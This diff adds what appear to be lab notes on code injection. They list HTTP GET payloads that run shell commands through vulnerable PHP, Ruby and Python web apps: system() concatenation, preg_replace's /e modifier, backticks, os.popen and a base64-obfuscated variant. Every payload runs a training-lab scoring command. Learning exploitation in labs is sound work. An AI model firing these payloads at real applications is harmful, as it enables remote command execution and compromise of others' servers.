@@ -1,0 +1,29 @@
+    FOR APPLICATIONS RUNNING ON PHP
+
+For example: if you want to run the command `ls`, you will need to send `system("ls")` to the application if it is a PHP application.
+
+the following was added to the http header GET /?name=hacker".system("/usr/local/bin/score+fae27255-2541-47ea-8179-b43ee35d22d1")." HTTP/1.1
+
+these was added to the http header GET /?order=id,1)%3b}system("/usr/local/bin/score+fae27255-2541-47ea-8179-b43ee35d22d1")%3b// HTTP/1.1
+  GET /?new=system("/usr/local/bin/score+fae27255-2541-47ea-8179-b43ee35d22d1")&pattern=/lamer/e&base=Hello%20lamer      {letter e was added after the match pattern lamer}
+
+the following payload(line of code) was added to the http request   GET /?name=hacker'.system("/usr/local/bin/score+fae27255-2541-47ea-8179-b43ee35d22d1").' HTTP/1.1 
+
+
+
+	APPLICATIONS RUNNING ON RUBY
+
+GET /?username=hacker"%2b`/usr/local/bin/score%20fae27255-2541-47ea-8179-b43ee35d22d1`%2b" HTTP/1.1
+
+
+        APPLICATIONS RUNNING PYTHON
+incases where url doesnt have an "=" parameter it is always good to inject code as part of the url
+GET /hello/hacker"%2bstr(os.popen("/usr/local/bin/score fae27255-2541-47ea-8179-b43ee35d22d1").read())%2b" HTTP/1.1
+
+
+GET /hello/hacker"%2bstr(__import__('os').popen("/usr/local/bin/score fae27255-2541-47ea-8179-b43ee35d22d1").read())%2b" HTTP/1.1
+
+
+base64 encode and decode 
+
+http://ptl-f668f7b0-f276a94c.libcurl.so/hello/hacker%22%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgZmFlMjcyNTUtMjU0MS00N2VhLTgxNzktYjQzZWUzNWQyMmQx')).read())%2b%22
